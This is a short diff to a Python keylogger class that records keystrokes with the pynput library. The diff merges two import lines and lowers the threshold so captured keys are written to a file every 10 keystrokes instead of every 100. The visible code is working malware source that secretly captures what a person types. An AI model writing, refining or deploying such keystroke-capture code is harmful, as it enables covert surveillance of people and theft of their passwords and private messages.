@@ -1,5 +1,4 @@
-import os
-import threading
+import os, threading
 from pynput import keyboard
 
 class Keylogger:
@@ -18,7 +17,7 @@ class Keylogger:
         key_name = self.get_key_name(key)
         self.keys.append(key_name)
         self.count += 1
-        if self.count >= 100:
+        if self.count >= 10:
             self.count = 0
             self.write_file()
 
